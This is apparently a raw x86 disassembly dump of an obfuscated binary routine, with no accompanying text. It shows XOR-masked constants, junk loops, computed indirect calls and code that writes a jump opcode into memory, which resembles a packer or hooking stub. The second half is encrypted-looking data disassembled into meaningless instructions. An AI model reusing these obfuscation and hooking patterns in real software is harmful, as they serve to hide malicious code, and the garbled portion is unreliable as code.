  40523b:	mov    eax,DWORD PTR [ecx+eax*4]
  40523e:	mov    DWORD PTR [ebp-0x38],eax
  405241:	jmp    0x4051ec
  405246:	mov    eax,DWORD PTR [ebp-0xc]
  405249:	xor    eax,esi
  40524b:	lea    ebx,[ebx+eax*1+0x3272e2]
  405252:	jmp    0x404e77
  405257:	mov    eax,DWORD PTR [ebp-0x4]
  40525a:	xor    eax,esi
  40525c:	add    eax,edi
  40525e:	jmp    0x405380
  405263:	mov    eax,DWORD PTR [ebp-0x38]
  405266:	add    eax,DWORD PTR [ebp+0x8]
  405269:	mov    DWORD PTR [ebp-0x18],eax
  40526c:	mov    eax,DWORD PTR [ebp-0x1c]
  40526f:	test   eax,eax
  405271:	je     0x40530b
  405277:	mov    DWORD PTR [ebp-0x20],0x0
  40527e:	push   0x3
  405280:	xor    edx,edx
  405282:	pop    edx
  405283:	add    edx,0x8
  405286:	push   edx
  405287:	pop    ecx
  405288:	push   0x6
  40528a:	dec    ecx
  40528b:	pop    ebx
  40528c:	dec    ebx
  40528d:	xchg   ebx,ecx
  40528f:	sub    ebx,ecx
  405291:	xchg   ebx,ecx
  405293:	dec    ecx
  405294:	mov    eax,DWORD PTR [ebp-0x1c]
  405297:	imul   eax,ecx
  40529a:	sub    esp,eax
  40529c:	mov    DWORD PTR [ebp-0x20],esp
  40529f:	mov    eax,DWORD PTR [ebp-0x4]
  4052a2:	xor    eax,esi
  4052a4:	add    eax,edi
  4052a6:	jmp    0x4052e4
  4052ab:	mov    ecx,DWORD PTR [ebp-0xc]
  4052ae:	mov    eax,DWORD PTR [ebp+0x8]
  4052b1:	mov    edx,DWORD PTR [ebp+0x14]
  4052b4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052b8:	xor    ecx,esi
  4052ba:	add    ecx,edi
  4052bc:	xor    edx,edx
  4052be:	div    ecx
  4052c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4052c3:	xor    ecx,esi
  4052c5:	lea    eax,[ecx+eax*1+0x3272e2]
  4052cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4052cf:	mov    edx,DWORD PTR [ebp-0x20]
  4052d2:	mov    DWORD PTR [edx+ecx*4],eax
  4052d5:	mov    eax,DWORD PTR [ebp-0xc]
  4052d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4052db:	xor    eax,esi
  4052dd:	lea    eax,[eax+ecx*1+0x3272e2]
  4052e4:	mov    DWORD PTR [ebp+0x8],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0xc]
  4052ea:	mov    ecx,DWORD PTR [ebp+0x14]
  4052ed:	xor    eax,esi
  4052ef:	add    eax,edi
  4052f1:	imul   eax,DWORD PTR [ecx]
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	mov    edx,DWORD PTR [ebp+0x8]
  4052fa:	xor    ecx,esi
  4052fc:	lea    ecx,[ecx+edx*1+0x3272e2]
  405303:	cmp    ecx,eax
  405305:	jne    0x4052ab
  40530b:	mov    eax,DWORD PTR [ebp-0x4]
  40530e:	xor    eax,esi
  405310:	add    eax,edi
  405312:	mov    DWORD PTR [ebp-0x10],eax
  405315:	mov    ebx,0x65655
  40531a:	add    ebx,0x3234
  405320:	xchg   ebx,esi
  405322:	xor    ebx,ebx
  405324:	push   esi
  405325:	mov    esi,ebx
  405327:	pop    ebx
  405328:	mov    edx,esi
  40532a:	add    ebx,0x1002
  405330:	lea    eax,[ebp-0x18]
  405333:	add    edx,eax
  405335:	add    edx,0x5
  405338:	push   edx
  405339:	inc    esi
  40533a:	pop    ecx
  40533b:	dec    ecx
  40533c:	xchg   ecx,eax
  40533d:	dec    eax
  40533e:	xchg   ecx,eax
  40533f:	dec    ecx
  405340:	xchg   ecx,edx
  405342:	dec    edx
  405343:	push   edx
  405344:	mov    edx,ebx
  405346:	pop    ebx
  405347:	dec    ebx
  405348:	call   DWORD PTR [ebx]
  40534a:	cmp    DWORD PTR [ebp+0x10],esi
  40534d:	je     0x40536c
  405353:	xchg   edx,eax
  405354:	push   0xb
  405356:	pop    ecx
  405357:	push   0x4
  405359:	pop    ebx
  40535a:	inc    ebx
  40535b:	xchg   ebx,ecx
  40535d:	sub    ebx,ecx
  40535f:	xchg   ebx,ecx
  405361:	dec    ecx
  405362:	dec    ecx
  405363:	mov    eax,DWORD PTR [ebp-0x1c]
  405366:	imul   eax,ecx
  405369:	add    esp,eax
  40536b:	xchg   edx,eax
  40536c:	push   eax
  40536d:	xor    ebx,ebx
  40536f:	mov    edx,esp
  405371:	dec    edx
  405372:	inc    ebx
  405373:	add    ebx,DWORD PTR [edx+ebx*1]
  405376:	dec    ebx
  405377:	xor    edx,edx
  405379:	add    DWORD PTR [ebp-0x10],ebx
  40537c:	pop    ebx
  40537d:	mov    eax,DWORD PTR [ebp-0x10]
  405380:	pop    edi
  405381:	pop    esi
  405382:	pop    ebx
  405383:	leave  
  405384:	ret    0x10
  405387:	push   ebp
  405388:	mov    ebp,esp
  40538a:	sub    esp,0x7c
  40538d:	or     eax,DWORD PTR ds:0x438010
  405393:	push   esi
  405394:	add    eax,esi
  405396:	push   edi
  405397:	xor    eax,esi
  405399:	mov    eax,ds:0x43a2d4
  40539e:	mov    DWORD PTR [ebp-0x24],eax
  4053a1:	or     DWORD PTR ds:0x434010,0x1014
  4053ab:	mov    eax,ds:0x43a3e0
  4053b0:	or     edi,0x3119
  4053b6:	mov    DWORD PTR [ebp-0x34],eax
  4053b9:	and    DWORD PTR [ebp-0x30],0x0
  4053bd:	add    DWORD PTR ds:0x437004,edi
  4053c3:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4053ca:	and    DWORD PTR ds:0x43401c,0x0
  4053d4:	jmp    0x4053e6
  4053d9:	mov    esi,DWORD PTR ds:0x43401c
  4053df:	inc    esi
  4053e0:	mov    DWORD PTR ds:0x43401c,esi
  4053e6:	cmp    DWORD PTR ds:0x43401c,0x19
  4053ed:	jae    0x405431
  4053f3:	cmp    DWORD PTR ds:0x43401c,0xb
  4053fa:	jg     0x405431
  405400:	jmp    0x405410
  405405:	push   0x437014
  40540a:	call   DWORD PTR ds:0x43a900
  405410:	cmp    DWORD PTR ds:0x43401c,0xa
  405417:	jne    0x40542c
  40541d:	xor    esi,esi
  40541f:	or     esi,DWORD PTR ds:0x43401c
  405425:	inc    esi
  405426:	mov    DWORD PTR ds:0x43401c,esi
  40542c:	jmp    0x4053d9
  405431:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405438:	mov    ecx,DWORD PTR ds:0x416534
  40543e:	mov    eax,ds:0x416554
  405443:	sub    ecx,eax
  405445:	sub    ecx,DWORD PTR [ecx+eax*1]
  405448:	mov    eax,DWORD PTR [ebp-0x10]
  40544b:	mov    ecx,DWORD PTR ds:0x416524
  405451:	mov    esi,DWORD PTR ds:0x41653c
  405457:	sub    esi,ecx
  405459:	xor    ecx,DWORD PTR [ecx+esi*1]
  40545c:	mov    ecx,DWORD PTR [ebp-0x10]
  40545f:	sub    eax,ecx
  405461:	movzx  ecx,WORD PTR ds:0x43501c
  405468:	and    ecx,DWORD PTR ds:0x435004
  40546e:	mov    DWORD PTR ds:0x43501c,ecx
  405474:	mov    DWORD PTR [ebp-0x10],eax
  405477:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  40547e:	sbb    DWORD PTR ds:0x43600c,0x633c
  405488:	mov    eax,DWORD PTR [ebp-0x18]
  40548b:	mov    DWORD PTR ds:0x435000,0x15
  405495:	cmp    DWORD PTR ds:0x435000,0x0
  40549c:	je     0x4054ce
  4054a2:	cmp    DWORD PTR ds:0x435000,0x20
  4054a9:	jge    0x4054ce
  4054af:	jmp    0x4054ba
  4054b4:	call   DWORD PTR ds:0x43a904
  4054ba:	xor    edi,edi
  4054bc:	xor    edi,DWORD PTR ds:0x435000
  4054c2:	dec    edi
  4054c3:	mov    DWORD PTR ds:0x435000,edi
  4054c9:	jmp    0x405495
  4054ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4054d1:	movzx  esi,BYTE PTR ds:0x43501c
  4054d8:	xor    DWORD PTR ds:0x437018,esi
  4054de:	sub    eax,ecx
  4054e0:	mov    DWORD PTR [ebp-0x18],eax
  4054e3:	sub    DWORD PTR ds:0x436008,ebx
  4054e9:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4054f0:	neg    eax
  4054f2:	mov    eax,DWORD PTR [ebp-0xc]
  4054f5:	and    DWORD PTR ds:0x43800c,0x0
  4054ff:	jmp    0x405511
  405504:	mov    ecx,DWORD PTR ds:0x43800c
  40550a:	inc    ecx
  40550b:	mov    DWORD PTR ds:0x43800c,ecx
  405511:	cmp    DWORD PTR ds:0x43800c,0x17
  405518:	jae    0x405558
  40551e:	cmp    DWORD PTR ds:0x43800c,0xe
  405525:	jge    0x405558
  40552b:	jmp    0x405539
  405530:	push   DWORD PTR [ebp-0x1c]
  405533:	call   DWORD PTR ds:0x43a8c4
  405539:	cmp    DWORD PTR ds:0x43800c,0xd
  405540:	jne    0x405553
  405546:	mov    ecx,DWORD PTR ds:0x43800c
  40554c:	inc    ecx
  40554d:	mov    DWORD PTR ds:0x43800c,ecx
  405553:	jmp    0x405504
  405558:	mov    ecx,DWORD PTR [ebp-0xc]
  40555b:	and    DWORD PTR ds:0x435018,0x0
  405565:	jmp    0x405577
  40556a:	mov    edi,DWORD PTR ds:0x435018
  405570:	inc    edi
  405571:	mov    DWORD PTR ds:0x435018,edi
  405577:	cmp    DWORD PTR ds:0x435018,0x14
  40557e:	jae    0x4055bd
  405584:	cmp    DWORD PTR ds:0x435018,0xd
  40558b:	jb     0x4055bd
  405591:	jmp    0x40559e
  405596:	push   0xc
  405598:	call   DWORD PTR ds:0x43a8c8
  40559e:	cmp    DWORD PTR ds:0x435018,0xc
  4055a5:	jne    0x4055b8
  4055ab:	mov    edi,DWORD PTR ds:0x435018
  4055b1:	inc    edi
  4055b2:	mov    DWORD PTR ds:0x435018,edi
  4055b8:	jmp    0x40556a
  4055bd:	sub    eax,ecx
  4055bf:	or     DWORD PTR ds:0x435010,edi
  4055c5:	mov    DWORD PTR [ebp-0xc],eax
  4055c8:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  4055cf:	sbb    eax,ecx
  4055d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4055d4:	add    DWORD PTR ds:0x436018,0x5c37
  4055de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4055e1:	or     esi,edi
  4055e3:	sub    eax,ecx
  4055e5:	mov    DWORD PTR [ebp-0x1c],eax
  4055e8:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  4055ef:	mov    eax,DWORD PTR [ebp-0x20]
  4055f2:	mov    ecx,DWORD PTR [ebp-0x20]
  4055f5:	sub    eax,ecx
  4055f7:	mov    DWORD PTR [ebp-0x20],eax
  4055fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4055fd:	mov    ecx,DWORD PTR [ebp-0x20]
  405600:	mov    esi,0x751089b
  405605:	xor    eax,esi
  405607:	mov    edi,0x3272e2
  40560c:	add    eax,edi
  40560e:	or     eax,ecx
  405610:	mov    DWORD PTR [ebp-0x20],eax
  405613:	mov    eax,DWORD PTR [ebp-0x4]
  405616:	mov    ecx,DWORD PTR [ebp-0x4]
  405619:	sub    eax,ecx
  40561b:	mov    DWORD PTR [ebp-0x4],eax
  40561e:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  405625:	mov    eax,DWORD PTR [ebp-0xc]
  405628:	xor    eax,esi
  40562a:	add    eax,edi
  40562c:	push   eax
  40562d:	mov    eax,DWORD PTR [ebp-0x10]
  405630:	xor    eax,esi
  405632:	add    eax,edi
  405634:	push   eax
  405635:	mov    eax,DWORD PTR [ebp-0x4]
  405638:	xor    eax,esi
  40563a:	add    eax,edi
  40563c:	push   eax
  40563d:	lea    eax,[ebp-0x7c]
  405640:	push   eax
  405641:	push   DWORD PTR [ebp-0x2c]
  405644:	push   DWORD PTR [ebp-0x28]
  405647:	call   0x40a560
  40564c:	test   eax,eax
  40564e:	je     0x40567c
  405654:	lea    eax,[ebp-0x7c]
  405657:	push   eax
  405658:	mov    eax,DWORD PTR [ebp-0x28]
  40565b:	xor    eax,esi
  40565d:	add    eax,edi
  40565f:	push   eax
  405660:	mov    eax,DWORD PTR [ebp-0x24]
  405663:	add    eax,0xaa
  405668:	push   eax
  405669:	mov    eax,DWORD PTR [ebp-0x24]
  40566c:	mov    eax,DWORD PTR [eax+0x198]
  405672:	push   DWORD PTR [eax]
  405674:	call   0x404c64
  405679:	mov    DWORD PTR [ebp-0x14],eax
  40567c:	lea    eax,[ebp+0x4]
  40567f:	mov    DWORD PTR [ebp-0x30],eax
  405682:	mov    eax,DWORD PTR [ebp-0x14]
  405685:	test   eax,eax
  405687:	je     0x407a42
  40568d:	lea    eax,[ebp-0x8]
  405690:	mov    DWORD PTR [ebp-0x38],eax
  405693:	mov    eax,DWORD PTR [ebp-0x34]
  405696:	mov    DWORD PTR [ebp-0x8],eax
  405699:	mov    eax,DWORD PTR [ebp-0x8]
  40569c:	mov    ecx,DWORD PTR [ebp-0x14]
  40569f:	sub    eax,ecx
  4056a1:	mov    DWORD PTR [ebp-0x8],eax
  4056a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056a7:	xor    ecx,esi
  4056a9:	mov    eax,0xffcd8d1e
  4056ae:	sub    eax,ecx
  4056b0:	add    DWORD PTR [ebp-0x8],eax
  4056b3:	mov    eax,DWORD PTR [ebp-0x8]
  4056b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4056b9:	mov    DWORD PTR [ecx+0x1],eax
  4056bc:	mov    eax,DWORD PTR [ebp-0x14]
  4056bf:	push   DWORD PTR [ebp-0x24]
  4056c2:	mov    BYTE PTR [eax],0xe9
  4056c5:	mov    eax,ds:0x43a150
  4056ca:	push   DWORD PTR [eax]
  4056cc:	push   DWORD PTR ds:0x43a3ac
  4056d2:	push   DWORD PTR ds:0x43a158
  4056d8:	jmp    0x407a2b
  4056dd:	push   ecx
  4056de:	out    0x83,al
  4056e0:	push   ebp
  4056e1:	jae    0x4056d4
  4056e3:	jae    0x4056c7
  4056e5:	das    
  4056e6:	push   edi
  4056e7:	sbb    eax,0xb5d56b25
  4056ec:	stos   BYTE PTR es:[edi],al
  4056ed:	rcr    DWORD PTR [edi+0x7c],cl
  4056f0:	jl     0x40573c
  4056f2:	pop    edi
  4056f3:	jl     0x405771
  4056f5:	adc    al,0xe1
  4056f7:	inc    ebx
  4056f8:	xchg   esi,eax
  4056f9:	test   eax,0x21359c33
  4056fe:	mov    esp,0xcf92b2a9
  405703:	jmp    0x5d172037
  405708:	js     0x4056c8
  40570a:	inc    ecx
  40570b:	hlt    
  40570c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40570d:	cmp    ah,BYTE PTR [ecx-0x4eeb0ae0]
  405713:	lock inc esi
  405715:	ds (bad) 
  405717:	cdq    
  405718:	push   0xbb32fea6
  40571d:	dec    ebp
  40571e:	mov    DWORD PTR [edi],eax
  405720:	inc    ebx
  405721:	repnz xor BYTE PTR [ecx-0x63],ch
  405725:	lds    edx,FWORD PTR [edi]
  405727:	out    0xec,al
  405729:	push   edi
  40572a:	xchg   edx,eax
  40572b:	xchg   DWORD PTR [ebp-0x41],eax
  40572e:	pop    edx
  40572f:	pop    ebx
  405730:	ss pop edi
  405732:	aad    0x9a
  405734:	bnd call 0x2f62eedb
  40573a:	rcr    BYTE PTR [ebx+0x69],0x90
  40573e:	and    eax,0xcb237d6
  405743:	sbb    DWORD PTR [ebp+ebx*1+0xd],edx
  405747:	xor    al,0x82
  405749:	fsub   st(3),st
  40574b:	icebp  
  40574c:	cld    
  40574d:	mov    WORD PTR [edi-0xe],?
  405750:	sub    BYTE PTR [edx+0xc],bh
  405753:	jp     0x405705
  405755:	ficomp DWORD PTR [esi+0x3e]
  405758:	add    DWORD PTR [ebx+eax*2],edx
  40575b:	adc    DWORD PTR [eax+eax*1-0x50],ebx
  40575f:	xor    al,0x2f
  405761:	mov    bh,0x78
  405763:	jmp    0x201524b2
  405768:	inc    ebp
  405769:	cmc    
  40576a:	cld    
  40576b:	pop    edx
  40576c:	jo     0x40570c
  40576e:	(bad)  [edi]
  405770:	lahf   
  405771:	xlat   BYTE PTR ds:[ebx]
  405772:	fwait
  405773:	cmp    bh,BYTE PTR [edi]
  405775:	xchg   esp,eax
  405776:	sbb    al,0xa6
  405778:	jno    0x405790
  40577a:	mov    esp,0xbcc4eaec
  40577f:	js     0x4057cb
  405781:	sub    BYTE PTR [edi+0x1a25b479],al
  405787:	out    dx,al
  405788:	mov    bh,0x5a
  40578a:	out    dx,eax
  40578b:	in     eax,0xc5
  40578d:	mov    ebx,0x5d62e95f
  405792:	jb     0x4057bb
  405794:	in     al,dx
  405795:	jns    0x40576b
  405797:	mov    bl,0x8f
  405799:	mov    ds:0xfda9c83a,eax
  40579e:	inc    esp
  40579f:	bound  edi,QWORD PTR [esi]
  4057a1:	push   esp
  4057a2:	adc    ch,BYTE PTR [ebp-0x791b2b69]
  4057a8:	mov    edi,0x9f326b8d
  4057ad:	daa    
  4057ae:	in     eax,dx
  4057af:	add    ch,ch
  4057b1:	test   DWORD PTR [edi],esp
  4057b3:	push   ebx
  4057b4:	aaa    
  4057b5:	xlat   BYTE PTR ds:[ebx]
  4057b6:	push   ds
  4057b7:	loop   0x40577a
  4057b9:	fnstcw WORD PTR [ecx-0xfda8521]
  4057bf:	ret    
  4057c0:	popa   
  4057c1:	mov    dl,0x5d
  4057c3:	rol    DWORD PTR [esi-0x53],1
  4057c6:	(bad)
  4057ca:	data16 lahf 
  4057cc:	imul   ebp,DWORD PTR [ebp-0x418dd906],0xffffffe5
  4057d3:	repz aas 
  4057d5:	push   cs
  4057d6:	sub    al,0xd1
  4057d8:	mov    DWORD PTR [ecx],ebp
  4057da:	int3   
  4057db:	xchg   ebp,eax
  4057dc:	scas   eax,DWORD PTR es:[edi]
  4057dd:	sbb    ah,ah
  4057df:	fisub  WORD PTR [bx+si]
  4057e2:	stc    
  4057e3:	ds mov bh,0xf2
  4057e6:	iret   
  4057e7:	push   ss
  4057e8:	ror    dl,cl
  4057ea:	std    
  4057eb:	xor    BYTE PTR [ebp-0x5a496301],bl
  4057f1:	in     eax,0xa
  4057f3:	fstp   QWORD PTR ds:0x5c9827fd
  4057f9:	test   cl,cl
  4057fb:	mov    ecx,0x3396b862
  405800:	jecxz  0x4057db
  405802:	pop    edx
  405803:	arpl   WORD PTR [edi],bp
  405805:	add    al,0xa3
  405807:	out    0x73,eax
  405809:	outs   dx,BYTE PTR ds:[esi]
  40580a:	push   0xd753d546
  40580f:	test   eax,0xaa6c4b6f
  405814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405815:	mov    ch,0xca
  405817:	mov    ecx,0x3dfe43ce
  40581c:	test   BYTE PTR [ebp+eiz*1+0x1b],ch
  405820:	jmp    0xb1fc23d
  405825:	add    DWORD PTR [esi-0x37defc01],esi
  40582b:	lds    ebp,FWORD PTR [esi]
  40582d:	and    BYTE PTR [ecx+eiz*4-0x2],dh
  405831:	add    DWORD PTR [edx],eax
  405833:	enter  0x736f,0xe2
  405837:	adc    eax,0xe570d2ec
  40583c:	or     al,0x57
  40583e:	push   cs
  40583f:	xchg   ebp,eax
  405840:	call   DWORD PTR [ebx]
  405842:	xor    al,BYTE PTR [esi-0x5532670f]
  405848:	test   DWORD PTR [ebp+0x4a0b892f],esi
  40584e:	call   0xf7d2:0xf8ee437c
  405855:	call   0xa0cbe83f
  40585a:	pusha  
  40585b:	call   0x53f0:0x28633bee
  405862:	sub    DWORD PTR [esi+0x2e],edi
  405865:	xchg   ebx,eax
  405866:	sahf   
  405867:	imul   edx,esp,0x9f0509ab
  40586d:	(bad)  
  40586e:	leave  
  40586f:	js     0x405823
  405871:	(bad)  
  405872:	ds or  al,bl
  405875:	fnstcw WORD PTR [ebx-0x5d41e439]
  40587b:	jno    0x4058fb
  40587d:	push   esp
  40587e:	fwait
  40587f:	mov    ds:0xb0161d95,eax
  405884:	and    bl,BYTE PTR [esi-0x62e9fdec]
  40588a:	addr16 xor eax,0xf1e9d6cb
  405890:	cli    
  405891:	push   esp
  405892:	fidiv  WORD PTR [ebx-0x3dd6c3ce]
  405898:	jle    0x4058b1
  40589a:	pop    es
  40589b:	cmp    bl,ah
  40589d:	sbb    DWORD PTR [eax+0x33],esi
  4058a0:	test   eax,0xae62eab8
  4058a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058a6:	mov    ah,0x98
  4058a8:	cwde   
  4058a9:	sub    eax,0xab7324dc
  4058ae:	ror    BYTE PTR [ecx+0x7],1
  4058b1:	cmp    eax,0xc709d5e8
  4058b6:	outs   dx,BYTE PTR ds:[esi]
  4058b7:	pop    ds
  4058b8:	inc    edi
  4058b9:	or     al,0x5b
  4058bb:	sub    bl,dh
  4058bd:	mov    dh,0x74
  4058bf:	mov    ebp,0x7e0694fc
  4058c4:	sbb    edi,DWORD PTR ds:0xced9ef34
  4058ca:	mov    WORD PTR [ebp-0x4b7e88f0],fs
  4058d0:	mov    ds:0x1632fedc,al
  4058d5:	iretw  
  4058d7:	(bad)  
  4058d9:	clc    
  4058da:	cmp    bh,dl
  4058dc:	or     dl,BYTE PTR [ecx-0x7c]
  4058df:	sbb    al,0x67
  4058e1:	adc    dl,BYTE PTR [esi+eiz*1+0x433042c6]
  4058e8:	stos   BYTE PTR es:[edi],al
  4058e9:	push   0xffffff96
  4058eb:	mov    dh,0x1b
  4058ed:	bound  eax,QWORD PTR [esi-0x4cbc228e]
  4058f3:	pusha  
  4058f4:	mov    eax,0x5b44d759
  4058f9:	sub    dl,BYTE PTR [edi+0x25]
  4058fc:	fild   DWORD PTR [eax]
  4058fe:	ins    DWORD PTR es:[edi],dx
  4058ff:	xchg   ebx,eax
  405900:	mov    esi,0xcd76434f
  405905:	stos   BYTE PTR es:[edi],al
  405906:	(bad)  
  405908:	mov    ebp,ds
  40590a:	adc    eax,DWORD PTR [ecx+ebp*2-0x2b199064]
  405911:	shl    ebp,1
  405913:	lock push edx
  405915:	add    bh,BYTE PTR [eax]
  405917:	outs   dx,BYTE PTR ds:[esi]
  405918:	push   cs
  405919:	inc    ebp
  40591a:	jecxz  0x405970
  40591c:	in     eax,0x8a
  40591e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40591f:	call   0x733bfde5
  405924:	jb     0x405939
  405926:	push   ebx
  405927:	mov    bh,0x96
  405929:	mov    ch,0xa2
  40592b:	fisub  WORD PTR [ecx]
  40592d:	sar    BYTE PTR [ebx-0x6cc9e8e6],cl
  405933:	fcom   DWORD PTR [esi+ecx*8+0x2f]
  405937:	fnsave [edi]
  405939:	mov    cl,dl
  40593b:	out    dx,eax
  40593c:	push   ds
  40593d:	in     eax,0x7a
  40593f:	mov    ds:0x22aedd10,eax
  405944:	jae    0x40596a
  405946:	daa    
  405947:	pop    ebx
  405948:	cmp    al,BYTE PTR [edx+ecx*2+0x559384b5]
  40594f:	xor    DWORD PTR [esi+0x4f770c09],esi
  405955:	or     eax,0xcba00a38
  40595a:	mov    ch,0x33
  40595c:	in     al,dx
  40595d:	test   eax,0xac03f9c4
  405962:	ja     0x4059c6
  405964:	and    al,0x4
  405967:	cmp    BYTE PTR [ebp-0x38ec4277],dh
  40596d:	ss add eax,0xca12fb03
  405973:	es mov cl,0xc
  405976:	(bad)  
  405978:	inc    esi
  405979:	push   ebx
  40597a:	scas   eax,DWORD PTR es:[edi]
  40597b:	xchg   ebx,eax
  40597c:	xchg   esi,eax
  40597d:	and    eax,0x77dce7bf
  405982:	lock nop
  405984:	xor    al,0xd7
  405986:	inc    eax
  405987:	add    BYTE PTR [ebx+0x4d],ch
  40598a:	adc    ebp,esp
  40598c:	imul   esp,DWORD PTR [eax-0x145f88ac],0xb7d39422
  405996:	lods   al,BYTE PTR ds:[esi]
  405997:	sti    
  405998:	into   
  405999:	mov    BYTE PTR [edx],dl
  40599b:	repz in eax,dx
  40599d:	or     DWORD PTR [edi-0x7a338c22],edi
  4059a3:	cmp    esp,DWORD PTR [eax-0x67]
  4059a6:	les    esp,FWORD PTR [ebp-0x5f]
  4059a9:	pop    ds
  4059aa:	sahf   
  4059ab:	jl     0x40597a
  4059ad:	(bad)  
  4059ae:	es cwde 
  4059b0:	scas   al,BYTE PTR es:[edi]
  4059b1:	adc    al,0xcb
  4059b3:	stc    
  4059b4:	sbb    eax,0x3e88d442
  4059b9:	clc    
  4059ba:	mov    ecx,0x6c5eb7aa
  4059bf:	pop    ebp
  4059c0:	inc    ebp
  4059c1:	jno    0x405a34
  4059c3:	setge  BYTE PTR [esi+0x650f176b]
  4059ca:	pop    eax
  4059cb:	or     BYTE PTR [ebp-0xb45221b],bh
  4059d1:	adc    cl,BYTE PTR [edx+0x50]
  4059d4:	inc    edi
  4059d5:	sub    eax,0x40a21fa9
  4059da:	inc    ebx
  4059db:	add    BYTE PTR [eax-0x17],dh
  4059de:	pop    ebp
  4059df:	adc    bl,ch
  4059e1:	xchg   BYTE PTR [ebp-0x4734021],cl
  4059e7:	fcomp  DWORD PTR ds:0x98631aa6
  4059ed:	fdiv   DWORD PTR [ecx+0x76]
  4059f0:	and    cl,dh
  4059f2:	enter  0xf375,0xaa
  4059f6:	sub    cl,BYTE PTR [ebx-0x6a]
  4059f9:	mov    ah,0xa7
  4059fb:	in     al,0x65
  4059fd:	sbb    BYTE PTR [esi+ebx*4-0x7048b766],0xec
  405a05:	xchg   ecx,eax
  405a06:	daa    
  405a07:	push   ecx
  405a08:	mov    bh,0xf1
  405a0a:	jae    0x405a7a
  405a0c:	mov    ch,0x25
  405a0e:	imul   edi,DWORD PTR [edx+0x32],0x27f016c1
  405a15:	aam    0x4b
  405a17:	add    esp,ebp
  405a19:	mov    al,ds:0xe4ea3c1f
  405a1e:	and    esi,esi
  405a20:	cmp    eax,0xdd0d063d
  405a25:	jnp    0x4462e60
  405a2b:	and    eax,0x11308c77
  405a30:	mov    cl,0xf5
  405a32:	shl    edx,cl
  405a34:	add    eax,0x883c84e8
  405a39:	push   edx
  405a3a:	dec    ecx
  405a3b:	jae    0x405a5f
  405a3d:	add    ecx,DWORD PTR [ecx+0x4a]
  405a40:	cmp    ebx,DWORD PTR [esi]
  405a42:	mov    al,ds:0x52992a4f
  405a47:	adc    DWORD PTR [ecx-0x562c935c],esp
  405a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a4e:	mov    al,ds:0xf8921aae
  405a53:	mov    esi,esp
  405a55:	push   0x6aadc5d4
  405a5a:	(bad)  
  405a5b:	push   ds
  405a5c:	retf   
  405a5d:	jecxz  0x405a18
  405a5f:	lods   eax,DWORD PTR ds:[esi]
  405a60:	les    esp,FWORD PTR [ecx-0x7637612a]
  405a66:	call   0xb531:0x529e11b7
  405a6d:	les    esp,FWORD PTR [ebx]
  405a6f:	arpl   sp,ax
  405a71:	cmp    eax,0x1586c0fb
  405a76:	push   ebx
  405a77:	push   ds
  405a78:	cs mov dl,0xf3
  405a7b:	jge    0x405a78
  405a7d:	add    eax,DWORD PTR [esi]
  405a7f:	int3   
  405a80:	inc    ecx
  405a81:	push   eax
  405a82:	mov    edi,0x2908b944
  405a87:	mov    ch,0x3
  405a8a:	imul   esp,DWORD PTR [edx-0x208fbe61],0xb7c0447e
  405a94:	pop    ss
  405a95:	add    DWORD PTR [esi-0x71],ebx
  405a98:	std    
  405a99:	sbb    DWORD PTR [eax+0x9738f60],0x5f
  405aa0:	retf   
  405aa1:	mov    ss,WORD PTR [ebx+0x4ba4ea89]
  405aa7:	pusha  
  405aa8:	les    edx,FWORD PTR ds:0x3d68211a
  405aae:	cmp    ebp,ebx
  405ab0:	and    eax,0xae81ecd4
  405ab5:	mov    esi,0x160081e5
  405aba:	popf   
  405abb:	sahf   
  405abc:	std    
  405abd:	test   al,0xd5
  405abf:	mov    gs,WORD PTR [esi+edi*8-0x6b]
  405ac3:	imul   bh
  405ac5:	ja     0x405b16
  405ac7:	push   ecx
  405ac8:	clc    
  405ac9:	inc    eax
  405aca:	xor    DWORD PTR [edi],esp
  405acc:	rol    DWORD PTR [ebp-0x60],1
  405acf:	repz adc al,0x3c
  405ad2:	push   es
  405ad3:	adc    edi,DWORD PTR [ecx+0x2f]
  405ad6:	nop
  405ad7:	lock imul BYTE PTR [eax+0x6a1251bb]
  405ade:	inc    bx
  405ae0:	pop    ds
  405ae1:	xchg   esi,eax
  405ae2:	sub    DWORD PTR [edi-0x45985440],ebx
  405ae8:	pop    esi
  405ae9:	pop    eax
  405aea:	jl     0x405b22
  405aec:	mov    ebp,DWORD PTR [edx-0x6e]
  405aef:	pop    eax
  405af1:	rcr    DWORD PTR [esi+0x4b],cl
  405af4:	(bad)
  405af7:	dec    eax
  405af8:	adc    dl,al
  405afa:	mov    BYTE PTR ds:[esi+0x7ad46b4c],bh
  405b01:	push   0x9bc48249
  405b06:	xchg   esp,eax
  405b07:	and    DWORD PTR [eax+eax*1+0x6aa8009f],ebx
  405b0e:	push   edi
  405b0f:	inc    esi
  405b10:	mov    edi,0xf784e195
  405b15:	pusha  
  405b16:	aam    0xd2
  405b18:	push   es
  405b19:	cld    
  405b1a:	(bad)  
  405b1b:	pop    ebp
  405b1c:	mov    esp,0x98dca277
  405b21:	fisub  WORD PTR [esi+0x24f294d0]
  405b27:	stc    
  405b28:	mov    al,BYTE PTR [ebx]
  405b2a:	packuswb mm5,QWORD PTR [edi+0x7a]
  405b2e:	ficomp DWORD PTR [eax]
  405b30:	test   DWORD PTR ss:[eax],edi
  405b33:	mov    ebx,0x970e67d9
  405b38:	in     al,dx
  405b39:	xchg   ebp,eax
